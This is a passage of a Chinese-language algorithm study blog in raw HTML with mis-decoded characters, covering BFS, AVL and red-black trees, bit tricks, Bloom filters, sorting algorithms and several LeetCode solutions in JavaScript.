title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>BFS:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shortestPathBinaryMatrix = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> n = grid.length;</span><br><span class="line">  <span class="keyword">if</span> (grid[<span class="number">0</span>][<span class="number">0</span>] || grid[n - <span class="number">1</span>][n - <span class="number">1</span>]) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) <span class="keyword">return</span> n;</span><br><span class="line">  <span class="keyword">const</span> queue = [];</span><br><span class="line">  queue.push([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">const</span> directions = [[-<span class="number">1</span>, -<span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, -<span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>]];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [i, j, d] <span class="keyword">of</span> queue) &#123;</span><br><span class="line">    <span class="comment">// å·²ç»èµ°åˆ°å³ä¸‹è§’</span></span><br><span class="line">    <span class="keyword">if</span> (i === n - <span class="number">1</span> &amp;&amp; j === n - <span class="number">1</span>) <span class="keyword">return</span> d;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> [x, y] <span class="keyword">of</span> directions)&#123;</span><br><span class="line">      <span class="keyword">const</span> newI = i + x, newJ = j + y;</span><br><span class="line">      <span class="keyword">if</span>(<span class="number">0</span> &lt;= newI &amp;&amp; newI &lt; n &amp;&amp; <span class="number">0</span> &lt;= newJ &amp;&amp; newJ &lt; n &amp;&amp; !grid[newI][newJ])&#123;</span><br><span class="line">        queue.push([newI, newJ, d + <span class="number">1</span>]);</span><br><span class="line">        grid[newI][newJ] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯å‘å¼æœç´¢å¥½éš¾ï¼ˆtodoã€‚ã€‚ï¼‰</p><h1 id="AVLå’Œçº¢é»‘æ ‘"><a href="#AVLå’Œçº¢é»‘æ ‘" class="headerlink" title="AVLå’Œçº¢é»‘æ ‘"></a>AVLå’Œçº¢é»‘æ ‘</h1><p><img src="https://i.loli.net/2021/09/05/bFCEj642c9YBhuD.png" alt="image.png"></p><h2 id="AVL-æ€»ç»“"><a href="#AVL-æ€»ç»“" class="headerlink" title="AVL æ€»ç»“"></a>AVL æ€»ç»“</h2><ol><li>å¹³è¡¡äºŒå‰æœç´¢æ ‘</li><li>æ¯ä¸ªç»“ç‚¹å­˜balance factor= {-1, 0, 1}</li><li>å››ç§æ—‹è½¬æ“ä½œ</li></ol><p>ä¸è¶³ï¼šç»“ç‚¹éœ€è¦å­˜å‚¨é¢å¤–ä¿¡æ¯ã€ä¸”è°ƒæ•´æ¬¡æ•°é¢‘ç¹</p><h2 id="Red-black-Tree"><a href="#Red-black-Tree" class="headerlink" title="Red-black Tree"></a>Red-black Tree</h2><p>çº¢é»‘æ ‘æ˜¯ä¸€ç§<strong>è¿‘ä¼¼å¹³è¡¡</strong>çš„äºŒå‰æœç´¢æ ‘(Binary SearchTree) ï¼Œå®ƒèƒ½å¤Ÿç¡®ä¿ä»»ä½•ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘çš„<strong>é«˜åº¦å·®å°äºä¸¤å€</strong>ã€‚å…·ä½“æ¥è¯´ï¼Œçº¢é»‘æ ‘æ˜¯æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„äºŒå‰æœç´¢æ ‘ï¼š</p><ul><li>æ¯ä¸ªç»“ç‚¹è¦ä¹ˆæ˜¯çº¢è‰²ï¼Œè¦ä¹ˆæ˜¯é»‘è‰²</li><li>æ ¹ç»“ç‚¹æ˜¯é»‘è‰²</li><li>æ¯ä¸ªå¶ç»“ç‚¹ï¼ˆNILç»“ç‚¹ï¼Œ ç©ºç»“ç‚¹ï¼‰æ˜¯é»‘è‰²çš„ã€‚</li><li>.ä¸èƒ½æœ‰ç›¸é‚»æ¥çš„ä¸¤ä¸ªçº¢è‰²ç»“ç‚¹</li><li>ä»ä»»ä¸€ç»“ç‚¹åˆ°å…¶æ¯ä¸ªå¶å­çš„æ‰€æœ‰è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²ç»“ç‚¹ã€‚</li></ul><h2 id="åŒºåˆ«-1"><a href="#åŒºåˆ«-1" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h2><ul><li>AVLtrees provide <strong>faster lookups</strong> than Red Black Trees because they are <strong>more strictly balanced</strong>.</li><li>Red Black Trees provide <strong>faster insertion and removal</strong> operations than AVL trees as fewer rotations are done due to relatively relaxed balancing.</li><li>AVLtrees store balance <strong>factors or heights</strong> with eachnode, thus requires storage for an integer per nodewhereas Red Black Tree requires only 1 bit of information per node.</li><li>Red Black Trees are used in most of the <strong>language libraries like map, multimap, multisetin C++</strong> whereas AVL trees are used in <strong>databases</strong> where faster retrievals are required.</li></ul><h1 id="ä½è¿ç®—"><a href="#ä½è¿ç®—" class="headerlink" title="ä½è¿ç®—"></a>ä½è¿ç®—</h1><h2 id="æŒ‡å®šä½ç½®çš„ä½è¿ç®—"><a href="#æŒ‡å®šä½ç½®çš„ä½è¿ç®—" class="headerlink" title="æŒ‡å®šä½ç½®çš„ä½è¿ç®—"></a>æŒ‡å®šä½ç½®çš„ä½è¿ç®—</h2><ol><li>å°† x æœ€å³è¾¹çš„ n ä½æ¸…é›¶ï¼š <code>x &amp; (~0 &lt;&lt; n)</code> ï¼ˆ~0 &lt;&lt; n è¡¨ç¤ºå…¨1åé¢æœ‰ n ä¸ª0ï¼Œå†å’Œ x ç›¸ä¸ï¼‰</li><li>è·å– x çš„ç¬¬ n ä½å€¼ï¼ˆ0 æˆ–è€… 1ï¼‰ï¼š<code>(x &gt;&gt; n) &amp; 1</code> ï¼ˆx &gt;&gt; n è¡¨ç¤º x çš„ç¬¬ n ä½å˜æˆæœ€åä¸€ä½ï¼‰</li><li>è·å– x çš„ç¬¬ n ä½çš„å¹‚å€¼ï¼š <code>x &amp; (1 &lt;&lt; (n-1))</code></li><li>ä»…å°†ç¬¬ n ä½ç½®ä¸º1ï¼š <code>x | (1 &lt;&lt; n)</code></li><li>ä»…å°†ç¬¬ n ä½ç½®ä¸º0ï¼š<code>x &amp; (~(1 &lt;&lt; n))</code></li><li>å°† x æœ€é«˜ä½è‡³ç¬¬ n ä½ï¼ˆå«ï¼‰æ¸…é›¶ï¼š<code>x &amp; ((1 &lt;&lt; n)-1)</code></li><li>å°†ç¬¬ n ä½è‡³ç¬¬ 0 ä½ï¼ˆå«ï¼‰æ¸…é›¶ï¼š <code>x &amp; (~((1 &lt;&lt; (n+1))-1))</code></li></ol><h2 id="å®æˆ˜ä½è¿ç®—è¦ç‚¹"><a href="#å®æˆ˜ä½è¿ç®—è¦ç‚¹" class="headerlink" title="å®æˆ˜ä½è¿ç®—è¦ç‚¹"></a>å®æˆ˜ä½è¿ç®—è¦ç‚¹</h2><ul><li><strong>åˆ¤æ–­å¥‡å¶ï¼šï¼ˆå»ºè®®ä»¥åéƒ½ç”¨ä½è¿ç®—ï¼‰</strong><br><code>x % 2 == 1 â€”&gt; (x &amp; 1) == 1</code><br><code>x % 2 == 0 â€”&gt; (x &amp; 1) == 0</code></li><li><code>x &gt;&gt; 1 â€”&gt; x/ 2</code><br>å³ï¼šx=x/ 2; â€”&gt; x=x &gt;&gt; 1;<br>mid =(left +right)/2;â€”&gt; mid =(left + right) &gt;&gt; 1;</li><li><strong>æ¸…é›¶æœ€ä½ä½çš„1ï¼šï¼ˆé«˜é¢‘ï¼‰</strong><code>X = X &amp;(X-1)</code> </li><li><strong>å¾—åˆ°æœ€ä½ä½çš„1ï¼š</strong><code>X &amp; -X</code></li><li><strong>å¾—åˆ°0 ï¼š</strong><code>X &amp; ~X</code> </li></ul><h2 id="LeetCode191â€”â€”ä½1çš„ä¸ªæ•°ï¼ˆâ˜†ï¼‰"><a href="#LeetCode191â€”â€”ä½1çš„ä¸ªæ•°ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode191â€”â€”ä½1çš„ä¸ªæ•°ï¼ˆâ˜†ï¼‰"></a>LeetCode191â€”â€”ä½1çš„ä¸ªæ•°ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/number-of-1-bits/">è·³è½¬åœ°å€</a></p><ol><li>for loopï¼š0 â€”&gt; 32 å¾ªç¯åˆ¤æ–­ â€œ1â€ã€‚</li><li>%2ï¼Œ/2 ï¼ˆ32æ¬¡ï¼‰</li><li>&amp;1ï¼Œx = x &gt;&gt; 1ï¼ˆ32æ¬¡ï¼‰</li><li>while(x) { count++; x = x &amp; (x - 1);}ï¼ˆæœ€ä½³ï¼‰</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hammingWeight = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode190â€”â€”é¢ å€’äºŒè¿›åˆ¶ä½ï¼ˆâ˜†ï¼‰"><a href="#LeetCode190â€”â€”é¢ å€’äºŒè¿›åˆ¶ä½ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode190â€”â€”é¢ å€’äºŒè¿›åˆ¶ä½ï¼ˆâ˜†ï¼‰"></a>LeetCode190â€”â€”é¢ å€’äºŒè¿›åˆ¶ä½ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/reverse-bits/">è·³è½¬åœ°å€</a></p><p>int â€”&gt; string â€”&gt; reverse â€”&gt; int ä½†æ˜¯è¿™æ ·æ•ˆç‡æä½ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-11"><a href="#æ€è·¯1-amp-é¢˜è§£-11" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>ä½è¿ç®—ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseBits = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    res = (res &lt;&lt; <span class="number">1</span>) + (n &amp; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// n = n &gt;&gt; 1; </span></span><br><span class="line">    n = n &gt;&gt;&gt; <span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res &gt;&gt;&gt; <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-10"><a href="#æ€è·¯2-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ä¸ç”¨æ— ç¬¦å·ä½ç§»ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseBits = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">0</span>, count = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">    result *= <span class="number">2</span>;</span><br><span class="line">    result += n &amp; <span class="number">1</span>;</span><br><span class="line">    n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode338â€”â€”æ¯”ç‰¹ä½è®¡æ•°ï¼ˆâ˜†ï¼‰"><a href="#LeetCode338â€”â€”æ¯”ç‰¹ä½è®¡æ•°ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode338â€”â€”æ¯”ç‰¹ä½è®¡æ•°ï¼ˆâ˜†ï¼‰"></a>LeetCode338â€”â€”æ¯”ç‰¹ä½è®¡æ•°ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/counting-bits/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -15"><a href="#è‡ªå·±çš„ä»£ç -15" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countBits = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>, x = i;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      x = x &amp; (x - <span class="number">1</span>);</span><br><span class="line">      count++;</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(count);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯-amp-é¢˜è§£-16"><a href="#æ€è·¯-amp-é¢˜è§£-16" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p><strong>åŠ¨æ€è§„åˆ’+ä½è¿ç®—ï¼š</strong>å¯¹äºä»»ä¸€æ•° iï¼Œå®ƒäºŒè¿›åˆ¶æ•°ä¸­ 1 çš„ä¸ªæ•° = i å³ç§»ä¸€ä½ çš„ 1 çš„ä¸ªæ•° + i æœ«ä½ 1 çš„ä¸ªæ•°</p><p>ç”¨ dp[i] è¡¨ç¤º i å¯¹åº”äºŒè¿›åˆ¶æ•°ä¸­ 1 çš„ä¸ªæ•°ï¼Œå³ dp[i] = dp[i &gt;&gt; 1] + (i &amp; 1)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countBits = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dp = <span class="built_in">Array</span>(num+<span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span> ;i&lt; num+<span class="number">1</span>;i++)&#123;</span><br><span class="line">    dp[i] = dp[i&gt;&gt;<span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="å¸ƒéš†è¿‡æ»¤å™¨"><a href="#å¸ƒéš†è¿‡æ»¤å™¨" class="headerlink" title="å¸ƒéš†è¿‡æ»¤å™¨"></a>å¸ƒéš†è¿‡æ»¤å™¨</h1><h2 id="Bloom-Filter-Vs-Hash-Table"><a href="#Bloom-Filter-Vs-Hash-Table" class="headerlink" title="Bloom Filter Vs Hash Table"></a>Bloom Filter Vs Hash Table</h2><p>ä¸€ä¸ªå¾ˆé•¿çš„äºŒè¿›åˆ¶å‘é‡å’Œä¸€ç³»åˆ—éšæœºæ˜ å°„å‡½æ•°ã€‚å¸ƒéš†è¿‡æ»¤å™¨å¯ä»¥ç”¨äºæ£€ç´¢ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ä¸€ä¸ªé›†åˆä¸­ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong>ç©ºé—´æ•ˆç‡å’ŒæŸ¥è¯¢æ—¶é—´éƒ½è¿œè¿œè¶…è¿‡èˆ¬çš„ç®—æ³•</p><p><strong>ç¼ºç‚¹ï¼š</strong>æœ‰ä¸€å®šçš„è¯¯è¯†åˆ«ç‡å’Œåˆ é™¤å›°éš¾ã€‚</p><h1 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h1><p>å…·ä½“è§<a href="https://www.cnblogs.com/onepixel/p/7674659.html">åå¤§ç»å…¸æ’åºç®—æ³•ï¼ˆåŠ¨å›¾æ¼”ç¤ºï¼‰</a></p><p><img src="https://i.loli.net/2021/09/06/sucGyXieoSvHBrI.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/06/wZMKBa1Jol7CDbr.png" alt="image.png"></p><h2 id="åˆçº§æ’åº-â€”â€”-O-n-2"><a href="#åˆçº§æ’åº-â€”â€”-O-n-2" class="headerlink" title="åˆçº§æ’åº â€”â€” O(n^2)"></a>åˆçº§æ’åº â€”â€” O(n^2)</h2><ol><li><p>é€‰æ‹©æ’åº(Selection Sort)ï¼šæ¯æ¬¡æ‰¾æœ€å°å€¼ï¼Œç„¶åæ”¾åˆ°å¾…æ’åºæ•°ç»„çš„èµ·å§‹ä½ç½®ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &lt; arr[minIndex]) &#123;    </span><br><span class="line">        minIndex = j;                </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>æ’å…¥æ’åº(Insertion Sort)ï¼šä»å‰åˆ°åé€æ­¥æ„å»ºæœ‰åºåºåˆ—;å¯¹äºæœ«æ’åºæ•°æ®ï¼Œåœ¨å·²æ’åºåºåˆ—ä¸­ä»åå‘å‰æ‰«æï¼Œæ‰¾åˆ°ç›¸åº”ä½ç½®å¹¶æ’å…¥ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = arr.length;</span><br><span class="line">  <span class="keyword">let</span> preIndex, current;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">      preIndex = i - <span class="number">1</span>;</span><br><span class="line">      current = arr[i];</span><br><span class="line">      <span class="keyword">while</span>(preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">          arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">          preIndex--;</span><br><span class="line">      &#125;</span><br><span class="line">      arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å†’æ³¡æ’åº(Bubble Sort)ï¼šåµŒå¥—å¾ªç¯ï¼Œæ¯æ¬¡æŸ¥çœ‹ç›¸é‚»çš„å…ƒç´ å¦‚æœé€†åºï¼Œåˆ™äº¤æ¢ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &gt; arr[j+<span class="number">1</span>]) &#123;      </span><br><span class="line">        [arr[j], arr[j + <span class="number">1</span>]] = [arr[j + <span class="number">1</span>], arr[j]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="é«˜çº§æ’åº-â€”â€”-O-N-LogN"><a href="#é«˜çº§æ’åº-â€”â€”-O-N-LogN" class="headerlink" title="é«˜çº§æ’åº â€”â€” O(N*LogN)"></a>é«˜çº§æ’åº â€”â€” O(N*LogN)</h2><ul><li>å¿«é€Ÿæ’åº(Quick Sort)ï¼šæ•°ç»„å–æ ‡æ†pivot,å°†å°å…ƒç´ æ”¾pivotå·¦è¾¹ï¼Œå¤§å…ƒç´ æ”¾å³ä¾§ï¼Œç„¶åä¾æ¬¡å¯¹å³è¾¹å’Œå³è¾¹çš„å­æ•°ç»„ç»§ç»­å¿«æ’ï¼›ä»¥è¾¾åˆ°æ•´ä¸ªåºåˆ—æœ‰åºã€‚</li><li>å½’å¹¶æ’åº(Merge Sort) â€”â€”åˆ†æ²»<ul><li>æŠŠé•¿åº¦ä¸ºnçš„è¾“å…¥åºåˆ—åˆ†æˆä¸¤ä¸ªé•¿åº¦ä¸ºn/2çš„å­åºåˆ—;</li><li>å¯¹è¿™ä¸¤ä¸ªå­åºåˆ—åˆ†åˆ«é‡‡ç”¨å½’å¹¶æ’åº;</li><li>å°†ä¸¤ä¸ªæ’åºå¥½çš„å­åºåˆ—åˆå¹¶æˆä¸€ä¸ªæœ€ç»ˆçš„æ’åºåºåˆ—ã€‚</li></ul></li></ul><p><strong>å½’å¹¶å’Œå¿«æ’å…·æœ‰ç›¸ä¼¼æ€§ï¼Œä½†æ­¥éª¤é¡ºåºç›¸åï¼š</strong></p><p>å½’å¹¶ï¼šå…ˆæ’åºå·¦å³å­æ•°ç»„ï¼Œç„¶ååˆå¹¶ä¸¤ä¸ªæœ‰åºå­æ•°ç»„<br>å¿«æ’ï¼šå…ˆè°ƒé…å‡ºå·¦å³å­æ•°ç»„ï¼Œç„¶åå¯¹äºå·¦å³å­æ•°ç»„è¿›è¡Œæ’åº</p><ul><li>å †æ’åº(Heap Sort)ï¼š å †æ’å…¥O(logN)ï¼Œå–æœ€å¤§/å°å€¼O(1)<ul><li>æ•°ç»„å…ƒç´ ä¾æ¬¡å»ºç«‹å°é¡¶å †</li><li>ä¾æ¬¡å–å †é¡¶å…ƒç´ ,å¹¶åˆ é™¤</li></ul></li></ul><h1 id="ç‰¹æ®Šæ’åº-â€”â€”-O-n"><a href="#ç‰¹æ®Šæ’åº-â€”â€”-O-n" class="headerlink" title="ç‰¹æ®Šæ’åº â€”â€” O(n)"></a>ç‰¹æ®Šæ’åº â€”â€” O(n)</h1><ol><li>è®¡æ•°æ’åº(Counting Sort)ï¼šè®¡æ•°æ’åºè¦æ±‚è¾“å…¥çš„æ•°æ®å¿…é¡»æ˜¯æœ‰ç¡®å®šèŒƒå›´çš„æ•´æ•°ã€‚å°†è¾“å…¥çš„æ•°æ®å€¼è½¬åŒ–ä¸ºé”®å­˜<br>å‚¨åœ¨é¢å¤–å¼€è¾Ÿçš„æ•°ç»„ç©ºé—´ä¸­ï¼›ç„¶åä¾æ¬¡æŠŠè®¡æ•°å¤§äº1çš„å¡«å……å›åŸæ•°ç»„ã€‚</li><li>æ¡¶æ’åº(Bucket Sort)ï¼šå‡è®¾è¾“å…¥æ•°æ®æœä»å‡åŒ€åˆ†å¸ƒï¼Œå°†æ•°æ®åˆ†åˆ°æœ‰é™æ•°é‡çš„æ¡¶é‡Œï¼Œæ¯ä¸ªæ¡¶å†åˆ†åˆ«æ’åº(æœ‰å¯èƒ½å†ä½¿ç”¨åˆ«çš„æ’åºç®—æ³•æˆ–æ˜¯ä»¥é€’å½’æ–¹å¼ç»§ç»­ä½¿ç”¨æ¡¶æ’åºè¿›è¡Œæ’)ã€‚</li><li>åŸºæ•°æ’åº(Radix Sort)ï¼šåŸºæ•°æ’åºæ˜¯æŒ‰ç…§ä½ä½å…ˆæ’åºï¼Œç„¶åæ”¶é›†ï¼›å†æŒ‰ç…§é«˜ä½æ’åºï¼Œç„¶åå†æ”¶é›†ï¼›ä¾æ¬¡ç±»æ¨ï¼Œç›´åˆ°æœ€é«˜ä½ã€‚æœ‰æ—¶å€™æœ‰äº›å±æ€§æ˜¯æœ‰ä¼˜å…ˆçº§é¡ºåºçš„ï¼Œå…ˆæŒ‰ä½ä¼˜å…ˆçº§æ’åºï¼Œå†æŒ‰é«˜ä¼˜å…ˆçº§æ’åºã€‚</li></ol><h2 id="LeetCode1122â€”â€”æ•°ç»„çš„ç›¸å¯¹æ’åºï¼ˆâ˜†ï¼‰"><a href="#LeetCode1122â€”â€”æ•°ç»„çš„ç›¸å¯¹æ’åºï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode1122â€”â€”æ•°ç»„çš„ç›¸å¯¹æ’åºï¼ˆâ˜†ï¼‰"></a>LeetCode1122â€”â€”æ•°ç»„çš„ç›¸å¯¹æ’åºï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/relative-sort-array/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -16"><a href="#è‡ªå·±çš„ä»£ç -16" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>æ„Ÿè§‰è¿™é“é¢˜éš¾åº¦ä¸æ­¢ easy ï¼Œä¸€å¼€å§‹æ˜¯æƒ³å…ˆå¯¹ arr1 æ’åºï¼Œç„¶åéå† arr2 ï¼Œå¦‚æœ arr1 æ²¡æœ‰å°± shift å† pushã€‚ä½†æ˜¯å¾ˆéº»çƒ¦ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-17"><a href="#æ€è·¯-amp-é¢˜è§£-17" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> relativeSortArray = <span class="function"><span class="keyword">function</span> (<span class="params">arr1, arr2</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//sort(a,b) æ­£å¸¸a,bä¸­è°å°æ’åˆ°å‰é¢</span></span><br><span class="line">  <span class="keyword">return</span> arr1.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a1 = arr2.indexOf(a);</span><br><span class="line">    <span class="keyword">let</span> b1 = arr2.indexOf(b);</span><br><span class="line">    <span class="keyword">if</span>(a1 == -<span class="number">1</span> &amp;&amp; b1 == -<span class="number">1</span>)&#123;<span class="comment">//å¦‚æœaå’Œbéƒ½ä¸åœ¨arr2ä¸­ï¼Œæ­£å¸¸çš„å¤§å°å‡åº</span></span><br><span class="line">      <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == -<span class="number">1</span>)&#123; <span class="comment">//å¦‚æœaä¸åœ¨arr2ä¸­ï¼Œa-b=1è¯´æ˜a&gt;bï¼Œaå°±å¾—æ’åœ¨åé¢</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b1 == -<span class="number">1</span>)&#123; <span class="comment">//å¦‚æœbä¸åœ¨arr2ä¸­ï¼Œa-b=-1è¯´æ˜b&gt;aï¼Œbå°±å¾—æ’åœ¨åé¢</span></span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">//å¦‚æœéƒ½åœ¨arr2ä¸­ï¼Œå°±çœ‹ä»–ä»¬è°å…ˆå‡ºç°åœ¨arr2ä¸­ï¼Œå¦‚æœaåœ¨å‰é¢ï¼Œé‚£ä¹ˆa1å°±å°äºb1,return å°±æ˜¯å°äº0çš„ï¼Œæ‰€ä»¥aåœ¨å‰é¢</span></span><br><span class="line">      <span class="keyword">return</span> a1-b1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰"><a href="#LeetCode242â€”â€”æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ï¼ˆâ˜†ï¼‰" class="headerlink" 